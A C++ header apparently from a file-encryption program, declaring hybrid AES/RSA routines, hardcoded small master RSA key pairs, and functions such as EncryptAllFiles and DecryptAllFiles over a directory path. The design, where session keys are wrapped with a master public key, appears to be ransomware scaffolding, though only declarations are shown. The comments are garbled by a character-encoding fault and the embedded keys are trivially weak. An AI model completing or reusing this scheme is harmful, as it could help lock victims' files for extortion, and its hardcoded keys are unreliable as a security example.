#pragma once
#ifndef MY_AES_FILE_H
#define MY_AES_FILE_H
#include <string>
using namespace std;

struct pub_key {
	long long pub_key;
	long long n;
};//��Կ
struct pri_key {
	long long pri_key;
	long long n;
};//˽Կ
pub_key session_pub_key;//ȫ�ֱ���������ɵ�rsa��Կsession_pub_key
pri_key session_pri_key;//ȫ�ֱ���������ɵ�rsa˽Կsession_pri_key

const pub_key master_pub_key = { 5903, 2045206627 };//���ù�Կ
const pri_key master_pri_key = { 256721999, 2045206627 };//˽Կ�����ڿͻ���**********************************

extern "C"  //��Ҫ���õ�C++����Ͱ�����д�����extern "C"��Χ�У�
{
void aes(unsigned char* key, string file_sname);
void deaes(pri_key encrypted_aes_key, string file_name, string decrypt_file_name);
void get_session_key(pub_key* session_pub_key, pri_key* session_pri_key);

void rsa(unsigned char* aes_key, pub_key session_pub_key, unsigned char* encrypted_aes_key);
void dersa(unsigned char* encrypted_aes_key, pri_key session_pri_key, unsigned char* aes_key);

void rsa_rsa(pri_key *session_pri_key, pub_key master_pub_key);
void dersa_rsa(pri_key* session_pri_key, pri_key master_pri_key);

void random(unsigned char* key);
void EncryptAllFiles(string path);
void DecryptAllFiles(string path, string fileType);
}
#endif

